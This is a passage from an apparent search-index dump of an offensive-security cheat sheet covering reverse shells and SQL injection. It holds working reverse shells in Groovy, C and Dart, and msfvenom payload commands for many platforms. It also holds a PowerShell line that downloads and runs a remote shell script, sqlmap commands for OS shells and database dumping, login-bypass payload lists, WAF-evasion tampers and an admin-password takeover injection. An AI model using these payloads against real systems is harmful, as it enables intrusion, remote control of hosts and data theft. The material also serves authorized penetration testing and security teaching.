/bin/bash')\n\nor\n\nhttps://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py\n</code></pre>"},{"location":"shells/reverse-shell/#groovy","title":"Groovy","text":"<p>by frohoff NOTE: Java reverse shell also work for Groovy</p> <pre><code>String host=\"10.0.0.1\";\nint port=4242;\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n</code></pre>"},{"location":"shells/reverse-shell/#groovy-alternative-1","title":"Groovy Alternative 1","text":"<p>NOTE: This is more stealthy</p> <pre><code>Thread.start {\n    // Reverse shell here\n}\n</code></pre>"},{"location":"shells/reverse-shell/#c","title":"C","text":"<p>Compile with <code>gcc /tmp/shell.c --output csh &amp;&amp; csh</code></p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/socket.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;netinet/in.h&gt;\n#include &lt;arpa/inet.h&gt;\n\nint main(void){\n    int port = 4242;\n    struct sockaddr_in revsockaddr;\n\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n    revsockaddr.sin_family = AF_INET;       \n    revsockaddr.sin_port = htons(port);\n    revsockaddr.sin_addr.s_addr = inet_addr(\"10.0.0.1\");\n\n    connect(sockt, (struct sockaddr *) &amp;revsockaddr, \n    sizeof(revsockaddr));\n    dup2(sockt, 0);\n    dup2(sockt, 1);\n    dup2(sockt, 2);\n\n    char * const argv[] = {\"/bin/sh\", NULL};\n    execve(\"/bin/sh\", argv, NULL);\n\n    return 0;       \n}\n</code></pre>"},{"location":"shells/reverse-shell/#dart","title":"Dart","text":"<pre><code>import 'dart:io';\nimport 'dart:convert';\n\nmain() {\n  Socket.connect(\"10.0.0.1\", 4242).then((socket) {\n    socket.listen((data) {\n      Process.start('powershell.exe', []).then((Process process) {\n        process.stdin.writeln(new String.fromCharCodes(data).trim());\n        process.stdout\n          .transform(utf8.decoder)\n          .listen((output) { socket.write(output); });\n      });\n    },\n    onDone: () {\n      socket.destroy();\n    });\n  });\n}\n</code></pre>"},{"location":"shells/reverse-shell/#meterpreter-shell","title":"Meterpreter Shell","text":""},{"location":"shells/reverse-shell/#windows-staged-reverse-tcp","title":"Windows Staged reverse TCP","text":"<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe &gt; reverse.exe\n</code></pre>"},{"location":"shells/reverse-shell/#windows-stageless-reverse-tcp","title":"Windows Stageless reverse TCP","text":"<pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe &gt; reverse.exe\n</code></pre>"},{"location":"shells/reverse-shell/#linux-staged-reverse-tcp","title":"Linux Staged reverse TCP","text":"<pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf &gt;reverse.elf\n</code></pre>"},{"location":"shells/reverse-shell/#linux-stageless-reverse-tcp","title":"Linux Stageless reverse TCP","text":"<pre><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf &gt;reverse.elf\n</code></pre>"},{"location":"shells/reverse-shell/#other-platforms","title":"Other platforms","text":"<pre><code>$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f elf &gt; shell.elf\n$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f exe &gt; shell.exe\n$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f macho &gt; shell.macho\n$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f asp &gt; shell.asp\n$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f raw &gt; shell.jsp\n$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f war &gt; shell.war\n$ msfvenom -p cmd/unix/reverse_python LHOST=\"10.0.0.1\" LPORT=4242 -f raw &gt; shell.py\n$ msfvenom -p cmd/unix/reverse_bash LHOST=\"10.0.0.1\" LPORT=4242 -f raw &gt; shell.sh\n$ msfvenom -p cmd/unix/reverse_perl LHOST=\"10.0.0.1\" LPORT=4242 -f raw &gt; shell.pl\n$ msfvenom -p php/meterpreter_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f raw &gt; shell.php; cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php\n</code></pre>"},{"location":"shells/reverse-shell/#spawn-tty-shell","title":"Spawn TTY Shell","text":"<p>In order to catch a shell, you need to listen on the desired port. <code>rlwrap</code> will enhance the shell, allowing you to clear the screen with <code>[CTRL] + [L]</code>.</p> <pre><code>rlwrap nc 10.0.0.1 4242\nrlwrap -r -f . nc 10.0.0.1 4242\n-f . will make rlwrap use the current history file as a completion word list.\n-r Put all words seen on in- and output on the completion list.\n</code></pre> <p>Sometimes, you want to access shortcuts, su, nano and autocomplete in a partially tty shell.</p> <p> OhMyZSH might break this trick, a simple <code>sh</code> is recommended</p> <p>The main problem here is that zsh doesn't handle the stty command the same way bash or sh does. [...] stty raw -echo; fg[...] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect <pre><code>ctrl+z\necho $TERM &amp;&amp; tput lines &amp;&amp; tput cols\n# for bash\nstty raw -echo\nfg\n# for zsh\nstty raw -echo; fg\nreset\nexport SHELL=bash\nexport TERM=xterm-256color\nstty rows &lt;num&gt; columns &lt;cols&gt;\n</code></pre></p> <p>or use <code>socat</code> binary to get a fully tty reverse shell</p> <pre><code>socat file:`tty`,raw,echo=0 tcp-listen:12345\n</code></pre> <p>Alternatively, <code>rustcat</code> binary can automatically inject the TTY shell command.</p> <p>The shell will be automatically upgraded and the TTY size will be provided for manual adjustment. Not only that, upon exiting the shell, the terminal will be reset and thus usable.</p> <pre><code>stty raw -echo; stty size &amp;&amp; rcat l -ie \"/usr/bin/script -qc /bin/bash /dev/null\" 6969 &amp;&amp; reset\n</code></pre> <p>Spawn a TTY shell from an interpreter</p> <pre><code>/bin/sh -i\npython3 -c 'import pty; pty.spawn(\"/bin/sh\")'\npython3 -c \"__import__('pty').spawn('/bin/bash')\"\npython3 -c \"__import__('subprocess').call(['/bin/bash'])\"\nperl -e 'exec \"/bin/sh\";'\nperl: exec \"/bin/sh\";\nperl -e 'print `/bin/bash`'\nruby: exec \"/bin/sh\"\nlua: os.execute('/bin/sh')\n</code></pre> <ul> <li>vi: <code>:!bash</code></li> <li>vi: <code>:set shell=/bin/bash:shell</code></li> <li>nmap: <code>!sh</code></li> <li>mysql: <code>! bash</code></li> </ul> <p>Alternative TTY method</p> <pre><code>www-data@debian:/dev/shm$ su - user\nsu: must be run from a terminal\nwww-data@debian:/dev/shm$ /usr/bin/script -qc /bin/bash /dev/null\nwww-data@debian:/dev/shm$ su - user\nPassword: P4ssW0rD\nuser@debian:~$ \n</code></pre>"},{"location":"shells/reverse-shell/#fully-interactive-reverse-shell-on-windows","title":"Fully interactive reverse shell on Windows","text":"<p>The introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows handles terminals.</p> <p>ConPtyShell uses the function CreatePseudoConsole(). This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).</p> <p>Server Side:</p> <pre><code>stty raw -echo; (stty size; cat) | nc -lvnp 3001\n</code></pre> <p>Client Side:</p> <pre><code>IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001\n</code></pre> <p>Offline version of the ps1 available at --&gt; https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1</p>"},{"location":"shells/reverse-shell/#references","title":"References","text":"<ul> <li>Reverse Bash Shell One Liner</li> <li>Pentest Monkey - Cheat Sheet Reverse shell</li> <li>Spawning a TTY Shell</li> <li>Obtaining a fully interactive shell</li> </ul>"},{"location":"sql-injection-attacks/","title":"SQL Injection","text":"<p>A SQL injection attack consists of insertion or \"injection\" of a SQL query via the input data from the client to the application.</p> <p>Attempting to manipulate SQL queries may have goals including: - Information Leakage - Disclosure of stored data - Manipulation of stored data - Bypassing authorization controls</p>"},{"location":"sql-injection-attacks/#summary","title":"Summary","text":"<ul> <li>CheatSheets</li> <li>MSSQL Injection</li> <li>MySQL Injection</li> <li>OracleSQL Injection</li> <li>PostgreSQL Injection</li> <li>SQLite Injection</li> <li>Cassandra Injection</li> <li>HQL Injection</li> <li>DB2 Injection</li> <li>Entry point detection</li> <li>DBMS Identification</li> <li>SQL injection using SQLmap</li> <li>Basic arguments for SQLmap</li> <li>Load a request file and use mobile user-agent</li> <li>Custom injection in UserAgent/Header/Referer/Cookie</li> <li>Second order injection</li> <li>Shell</li> <li>Crawl a website with SQLmap and auto-exploit</li> <li>Using TOR with SQLmap</li> <li>Using a proxy with SQLmap</li> <li>Using Chrome cookie and a Proxy</li> <li>Using suffix to tamper the injection</li> <li>General tamper option and tamper's list</li> <li>SQLmap without SQL injection</li> <li>Authentication bypass</li> <li>Authentication Bypass (Raw MD5 SHA1)</li> <li>Polyglot injection</li> <li>Routed injection</li> <li>Insert Statement - ON DUPLICATE KEY UPDATE</li> <li>Generic WAF Bypass</li> <li>White spaces alternatives</li> <li>No Comma Allowed</li> <li>No Equal Allowed</li> <li>Case modification</li> </ul>"},{"location":"sql-injection-attacks/#entry-point-detection","title":"Entry point detection","text":"<p>Detection of an SQL injection entry point</p> <ul> <li>Error Messages: Inputting special characters (e.g., a single quote ') into input fields might trigger SQL errors. If the application displays detailed error messages, it can indicate a potential SQL injection point.</li> <li>Simple characters     <pre><code>'\n%27\n\"\n%22\n#\n%23\n;\n%3B\n)\nWildcard (*)\n&amp;apos;  # required for XML content\n</code></pre></li> <li>Multiple encoding     <pre><code>%%2727\n%25%27\n</code></pre></li> <li> <p>Unicode characters     <pre><code>Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was transformed into U+0022 QUOTATION MARK (\")\nUnicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was transformed into U+0027 APOSTROPHE (')\n</code></pre></p> </li> <li> <p>Tautology-Based SQL Injection: By inputting tautological (always true) conditions, you can test for vulnerabilities. For instance, entering <code>admin' OR '1'='1</code> in a username field might log you in as the admin if the system is vulnerable.</p> </li> <li>Merging characters     <pre><code>`+HERP\n'||'DERP\n'+'herp\n' 'DERP\n'%20'HERP\n'%2B'HERP\n</code></pre></li> <li> <p>Logic Testing     <pre><code>page.asp?id=1 or 1=1 -- true\npage.asp?id=1' or 1=1 -- true\npage.asp?id=1\" or 1=1 -- true\npage.asp?id=1 and 1=2 -- false\n</code></pre></p> </li> <li> <p>Timing Attacks: Inputting SQL commands that cause deliberate delays (e.g., using <code>SLEEP</code> or <code>BENCHMARK</code> functions in MySQL) can help identify potential injection points. If the application takes an unusually long time to respond after such input, it might be vulnerable.</p> </li> </ul>"},{"location":"sql-injection-attacks/#dbms-identification","title":"DBMS Identification","text":"<pre><code>[\"conv('a',16,2)=conv('a',16,2)\"                   ,\"MYSQL\"],\n[\"connection_id()=connection_id()\"                 ,\"MYSQL\"],\n[\"crc32('MySQL')=crc32('MySQL')\"                   ,\"MYSQL\"],\n[\"BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)\"       ,\"MSSQL\"],\n[\"@@CONNECTIONS&gt;0\"                                 ,\"MSSQL\"],\n[\"@@CONNECTIONS=@@CONNECTIONS\"                     ,\"MSSQL\"],\n[\"@@CPU_BUSY=@@CPU_BUSY\"                           ,\"MSSQL\"],\n[\"USER_ID(1)=USER_ID(1)\"                           ,\"MSSQL\"],\n[\"ROWNUM=ROWNUM\"                                   ,\"ORACLE\"],\n[\"RAWTOHEX('AB')=RAWTOHEX('AB')\"                   ,\"ORACLE\"],\n[\"LNNVL(0=123)\"                                    ,\"ORACLE\"],\n[\"5::int=5\"                                        ,\"POSTGRESQL\"],\n[\"5::integer=5\"                                    ,\"POSTGRESQL\"],\n[\"pg_client_encoding()=pg_client_encoding()\"       ,\"POSTGRESQL\"],\n[\"get_current_ts_config()=get_current_ts_config()\" ,\"POSTGRESQL\"],\n[\"quote_literal(42.5)=quote_literal(42.5)\"         ,\"POSTGRESQL\"],\n[\"current_database()=current_database()\"           ,\"POSTGRESQL\"],\n[\"sqlite_version()=sqlite_version()\"               ,\"SQLITE\"],\n[\"last_insert_rowid()&gt;1\"                           ,\"SQLITE\"],\n[\"last_insert_rowid()=last_insert_rowid()\"         ,\"SQLITE\"],\n[\"val(cvar(1))=1\"                                  ,\"MSACCESS\"],\n[\"IIF(ATN(2)&gt;0,1,0) BETWEEN 2 AND 0\"               ,\"MSACCESS\"],\n[\"cdbl(1)=cdbl(1)\"                                 ,\"MSACCESS\"],\n[\"1337=1337\",   \"MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL\"],\n[\"'i'='i'\",     \"MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL\"],\n</code></pre>"},{"location":"sql-injection-attacks/#sql-injection-using-sqlmap","title":"SQL injection using SQLmap","text":"<p>sqlmapproject/sqlmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection vulnerabilities and taking over database servers.</p>"},{"location":"sql-injection-attacks/#basic-arguments-for-sqlmap","title":"Basic arguments for SQLmap","text":"<pre><code>sqlmap --url=\"&lt;url&gt;\" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs\n</code></pre>"},{"location":"sql-injection-attacks/#load-a-request-file-and-use-mobile-user-agent","title":"Load a request file and use mobile user-agent","text":"<pre><code>sqlmap -r sqli.req --safe-url=http://10.10.10.10/ --mobile --safe-freq=1\n</code></pre>"},{"location":"sql-injection-attacks/#custom-injection-in-useragentheaderreferercookie","title":"Custom injection in UserAgent/Header/Referer/Cookie","text":"<pre><code>python sqlmap.py -u \"http://example.com\" --data \"username=admin&amp;password=pass\"  --headers=\"x-forwarded-for:127.0.0.1*\"\nThe injection is located at the '*'\n</code></pre>"},{"location":"sql-injection-attacks/#second-order-injection","title":"Second order injection","text":"<pre><code>python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order \"http://targetapp/wishlist\" -v 3\nsqlmap -r 1.txt -dbms MySQL -second-order \"http://&lt;IP/domain&gt;/joomla/administrator/index.php\" -D \"joomla\" -dbs\n</code></pre>"},{"location":"sql-injection-attacks/#shell","title":"Shell","text":"<ul> <li>SQL Shell: <code>python sqlmap.py -u \"http://example.com/?id=1\"  -p id --sql-shell</code></li> <li>OS Shell: <code>python sqlmap.py -u \"http://example.com/?id=1\"  -p id --os-shell</code></li> <li>Meterpreter: <code>python sqlmap.py -u \"http://example.com/?id=1\"  -p id --os-pwn</code></li> <li>SSH Shell: <code>python sqlmap.py -u \"http://example.com/?id=1\" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/</code></li> </ul>"},{"location":"sql-injection-attacks/#crawl-a-website-with-sqlmap-and-auto-exploit","title":"Crawl a website with SQLmap and auto-exploit","text":"<pre><code>sqlmap -u \"http://example.com/\" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3\n\n--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers\n--crawl = how deep you want to crawl a site\n--forms = Parse and test forms\n</code></pre>"},{"location":"sql-injection-attacks/#using-tor-with-sqlmap","title":"Using TOR with SQLmap","text":"<pre><code>sqlmap -u \"http://www.target.com\" --tor --tor-type=SOCKS5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5\n</code></pre>"},{"location":"sql-injection-attacks/#using-a-proxy-with-sqlmap","title":"Using a proxy with SQLmap","text":"<pre><code>sqlmap -u \"http://www.target.com\" --proxy=\"http://127.0.0.1:8080\"\n</code></pre>"},{"location":"sql-injection-attacks/#using-chrome-cookie-and-a-proxy","title":"Using Chrome cookie and a Proxy","text":"<pre><code>sqlmap -u \"https://test.com/index.php?id=99\" --load-cookie=/media/truecrypt1/TI/cookie.txt --proxy \"http://127.0.0.1:8080\"  -f  --time-sec 15 --level 3\n</code></pre>"},{"location":"sql-injection-attacks/#using-suffix-to-tamper-the-injection","title":"Using suffix to tamper the injection","text":"<pre><code>python sqlmap.py -u \"http://example.com/?id=1\"  -p id --suffix=\"-- \"\n</code></pre>"},{"location":"sql-injection-attacks/#general-tamper-option-and-tampers-list","title":"General tamper option and tamper's list","text":"<pre><code>tamper=name_of_the_tamper\n</code></pre> Tamper Description 0x2char.py Replaces each (MySQL) 0x encoded string with equivalent CONCAT(CHAR(),\u2026) counterpart apostrophemask.py Replaces apostrophe character with its UTF-8 full width counterpart apostrophenullencode.py Replaces apostrophe character with its illegal double unicode counterpart appendnullbyte.py Appends encoded NULL byte character at the end of payload base64encode.py Base64 all characters in a given payload between.py Replaces greater than operator ('&gt;') with 'NOT BETWEEN 0 AND #' bluecoat.py Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator chardoubleencode.py Double url-encodes all characters in a given payload (not processing already encoded) charencode.py URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; %53%45%4C%45%43%54) charunicodeencode.py Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; %u0053%u0045%u004C%u0045%u0043%u0054) charunicodeescape.py Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; \\u0053\\u0045\\u004C\\u0045\\u0043\\u0054) commalesslimit.py Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M' commalessmid.py Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)' commentbeforeparentheses.py Prepends (inline) comment before parentheses (e.g. ( -&gt; /**/() concat2concatws.py Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)' charencode.py Url-encodes all characters in a given payload (not processing already encoded) charunicodeencode.py Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded) equaltolike.py Replaces all occurrences of operator equal ('=') with operator 'LIKE' escapequotes.py Slash escape quotes (' and \") greatest.py Replaces greater than operator ('&gt;') with 'GREATEST' counterpart halfversionedmorekeywords.py Adds versioned MySQL comment before each keyword htmlencode.py HTML encode (using code points) all non-alphanumeric characters (e.g. \u2018 -&gt; ') ifnull2casewhenisnull.py Replaces instances like \u2018IFNULL(A, B)\u2019 with \u2018CASE WHEN ISNULL(A) THEN (B) ELSE (A) END\u2019 counterpart ifnull2ifisnull.py Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)' informationschemacomment.py Add an inline comment (/**/) to the end of all occurrences of (MySQL) \u201cinformation_schema\u201d identifier least.py Replaces greater than operator (\u2018&gt;\u2019) with \u2018LEAST\u2019 counterpart lowercase.py Replaces each keyword character with lower case value (e.g. SELECT -&gt; select) modsecurityversioned.py Embraces complete query with versioned comment modsecurityzeroversioned.py Embraces complete query with zero-versioned comment multiplespaces.py Adds multiple spaces around SQL keywords nonrecursivereplacement.py Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace(\"SELECT\", \"\")) filters overlongutf8.py Converts all characters in a given payload (not processing already encoded) overlongutf8more.py Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -&gt; %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94) percentage.py Adds a percentage sign ('%') infront of each character plus2concat.py Replaces plus operator (\u2018+\u2019) with (MsSQL) function CONCAT() counterpart plus2fnconcat.py Replaces plus operator (\u2018+\u2019) with (MsSQL) ODBC function {fn CONCAT()} counterpart randomcase.py Replaces each keyword character with random case value randomcomments.py Add random comments to SQL keywords securesphere.py Appends special crafted string sp_password.py Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs space2comment.py Replaces space character (' ') with comments space2dash.py Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\\n') space2hash.py Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\\n') space2morehash.py Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\\n') space2mssqlblank.py Replaces space character (' ') with a random blank character from a valid set of alternate characters space2mssqlhash.py Replaces space character (' ') with a pound character ('#') followed by a new line ('\\n') space2mysqlblank.py Replaces space character (' ') with a random blank character from a valid set of alternate characters space2mysqldash.py Replaces space character (' ') with a dash comment ('--') followed by a new line ('\\n') space2plus.py Replaces space character (' ') with plus ('+') space2randomblank.py Replaces space character (' ') with a random blank character from a valid set of alternate characters symboliclogical.py Replaces AND and OR logical operators with their symbolic counterparts (&amp;&amp; and unionalltounion.py Replaces UNION ALL SELECT with UNION SELECT unmagicquotes.py Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) uppercase.py Replaces each keyword character with upper case value 'INSERT' varnish.py Append a HTTP header 'X-originating-IP' versionedkeywords.py Encloses each non-function keyword with versioned MySQL comment versionedmorekeywords.py Encloses each keyword with versioned MySQL comment xforwardedfor.py Append a fake HTTP header 'X-Forwarded-For'"},{"location":"sql-injection-attacks/#sqlmap-without-sql-injection","title":"SQLmap without SQL injection","text":"<p>You can use SQLmap to access a database via its port instead of a URL.</p> <pre><code>sqlmap.py -d \"mysql://user:pass@ip/database\" --dump-all \n</code></pre>"},{"location":"sql-injection-attacks/#authentication-bypass","title":"Authentication bypass","text":"<pre><code>'-'\n' '\n'&amp;'\n'^'\n'*'\n' or 1=1 limit 1 -- -+\n'=\"or'\n' or ''-'\n' or '' '\n' or ''&amp;'\n' or ''^'\n' or ''*'\n'-||0'\n\"-||0\"\n\"-\"\n\" \"\n\"&amp;\"\n\"^\"\n\"*\"\n'--'\n\"--\"\n'--' / \"--\"\n\" or \"\"-\"\n\" or \"\" \"\n\" or \"\"&amp;\"\n\" or \"\"^\"\n\" or \"\"*\"\nor true--\n\" or true--\n' or true--\n\") or true--\n') or true--\n' or 'x'='x\n') or ('x')=('x\n')) or (('x'))=(('x\n\" or \"x\"=\"x\n\") or (\"x\")=(\"x\n\")) or ((\"x\"))=((\"x\nor 2 like 2\nor 1=1\nor 1=1--\nor 1=1#\nor 1=1/*\nadmin' --\nadmin' -- -\nadmin' #\nadmin'/*\nadmin' or '2' LIKE '1\nadmin' or 2 LIKE 2--\nadmin' or 2 LIKE 2#\nadmin') or 2 LIKE 2#\nadmin') or 2 LIKE 2--\nadmin') or ('2' LIKE '2\nadmin') or ('2' LIKE '2'#\nadmin') or ('2' LIKE '2'/*\nadmin' or '1'='1\nadmin' or '1'='1'--\nadmin' or '1'='1'#\nadmin' or '1'='1'/*\nadmin'or 1=1 or ''='\nadmin' or 1=1\nadmin' or 1=1--\nadmin' or 1=1#\nadmin' or 1=1/*\nadmin') or ('1'='1\nadmin') or ('1'='1'--\nadmin') or ('1'='1'#\nadmin') or ('1'='1'/*\nadmin') or '1'='1\nadmin') or '1'='1'--\nadmin') or '1'='1'#\nadmin') or '1'='1'/*\n1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055\nadmin\" --\nadmin';-- azer \nadmin\" #\nadmin\"/*\nadmin\" or \"1\"=\"1\nadmin\" or \"1\"=\"1\"--\nadmin\" or \"1\"=\"1\"#\nadmin\" or \"1\"=\"1\"/*\nadmin\"or 1=1 or \"\"=\"\nadmin\" or 1=1\nadmin\" or 1=1--\nadmin\" or 1=1#\nadmin\" or 1=1/*\nadmin\") or (\"1\"=\"1\nadmin\") or (\"1\"=\"1\"--\nadmin\") or (\"1\"=\"1\"#\nadmin\") or (\"1\"=\"1\"/*\nadmin\") or \"1\"=\"1\nadmin\") or \"1\"=\"1\"--\nadmin\") or \"1\"=\"1\"#\nadmin\") or \"1\"=\"1\"/*\n1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055\n</code></pre>"},{"location":"sql-injection-attacks/#authentication-bypass-raw-md5-sha1","title":"Authentication Bypass (Raw MD5 SHA1)","text":"<p>When a raw md5 is used, the pass will be queried as a simple string, not a hexstring.</p> <pre><code>\"SELECT * FROM admin WHERE pass = '\".md5($password,true).\"'\"\n</code></pre> <p>Allowing an attacker to craft a string with a <code>true</code> statement such as <code>' or 'SOMETHING</code></p> <pre><code>md5(\"ffifdyop\", true) = 'or'6\ufffd]\ufffd\ufffd!r,\ufffd\ufffdb\u001c\nsha1(\"3fDf \", true) = Q\ufffdu'='\ufffd@\ufffd[\ufffdt\ufffd- o\ufffd\ufffd_-!\n</code></pre> <p>Challenge demo available at http://web.jarvisoj.com:32772</p>"},{"location":"sql-injection-attacks/#polyglot-injection-multicontext","title":"Polyglot injection (multicontext)","text":"<pre><code>SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/\n\n/* MySQL only */\nIF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*/\n</code></pre>"},{"location":"sql-injection-attacks/#routed-injection","title":"Routed injection","text":"<pre><code>admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'\n</code></pre>"},{"location":"sql-injection-attacks/#insert-statement-on-duplicate-key-update","title":"Insert Statement - ON DUPLICATE KEY UPDATE","text":"<p>ON DUPLICATE KEY UPDATE keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:</p> <pre><code>Inject using payload:\n  attacker_dummy@example.com\", \"bcrypt_hash_of_qwerty\"), (\"admin@example.com\", \"bcrypt_hash_of_qwerty\") ON DUPLICATE KEY UPDATE password=\"bcrypt_hash_of_qwerty\" --\n\nThe query would look like this:\nINSERT INTO users (email, password) VALUES (\"attacker_dummy@example.com\", \"bcrypt_hash_of_qwerty\"), (\"admin@example.com\", \"bcrypt_hash_of_qwerty\") ON DUPLICATE KEY UPDATE password=\"bcrypt_hash_of_qwerty\" -- \", \"bcrypt_hash_of_your_password_input\");\n\nThis query will insert a row for the user \u201cattacker_dummy@example.com\u201d. It will also insert a row for the user \u201cadmin@example.com\u201d.\nBecause this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL to update the `password` column of the already existing row to \"bcrypt_hash_of_qwerty\".\n\nAfter this, we can simply authenticate with \u201cadmin@example.com\u201d and the password \u201cqwerty\u201d!\n</code></pre>"},{"location":"sql-injection-attacks/#generic-waf-bypass","title":"Generic WAF Bypass","text":""},{"location":"sql-injection-attacks/#white-spaces-alternatives","title":"White spaces alternatives","text":"<ul> <li>No space allowed (<code>%20</code>) - bypass using whitespace alternatives   <pre><code>?id=1%09and%091=1%09--\n?id=1%0Dand%0D1=1%0D--\n?id=1%0Cand%0C1=1%0C--\n?id=1%0Band%0B1=1%0B--\n?id=1%0Aand%0A1=1%0A--\n?id=1%A0and%A01=1%A0--\n</code></pre></li> <li>No whitespace - bypass using comments   <pre><code>?id=1/*comment*/and/**/1=1/**/--\n</code></pre></li> <li>No Whitespace - bypass using parenthesis   <pre><code>?id=(1)and(1)=(1)--\n</code></pre></li> <li>Whitespace alternatives by DBMS   <pre><code>-- Example of query where spaces were replaced by ascii characters above 0x80\n\u2640SELECT\u00a7*\u2302FROM\u263ausers\u266bWHERE\u26421\u263c=\u00b61\u203c\n</code></pre></li> </ul> DBMS ASCII characters in hexadicimal SQLite3 0A, 0D, 0C, 09, 20 MySQL 5 09, 0A, 0B, 0C, 0D, A0, 20 MySQL 3 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0 PostgreSQL 0A, 0D, 0C, 09, 20 Oracle 11g 00, 0A, 0D, 0C, 09, 20 MSSQL 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20"},{"location":"sql-injection-attacks/#no-comma-allowed","title":"No Comma Allowed","text":"<p>Bypass using OFFSET, FROM and JOIN</p> <pre><code>LIMIT 0,1         -&gt; LIMIT 1 OFFSET 0\nSUBSTR('SQL',1,1) -&gt; SUBSTR('SQL' FROM 1 FOR 1).\nSELECT 1,2,3,4    -&gt; UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d\n</code></pre>"},{"location":"sql-injection-attacks/#no-equal-allowed","title":"No Equal Allowed","text":"<p>Bypass using LIKE/NOT IN/IN/BETWEEN</p> <pre><code>?id=1 and substring(version(),1,1)like(5)\n?id=1 and substring(version(),1,1)not in(4,3)\n?id=1 and 